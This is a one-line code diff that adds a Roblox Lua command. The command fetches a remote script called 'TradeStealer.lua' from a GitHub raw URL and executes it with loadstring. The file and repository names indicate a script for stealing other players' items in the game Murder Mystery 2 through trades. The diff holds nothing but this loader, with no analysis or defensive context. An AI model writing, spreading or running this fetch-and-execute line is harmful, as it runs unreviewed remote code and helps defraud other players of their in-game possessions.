@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frxsty0nt0p/mm2/refs/heads/main/TradeStealer.lua", true))()
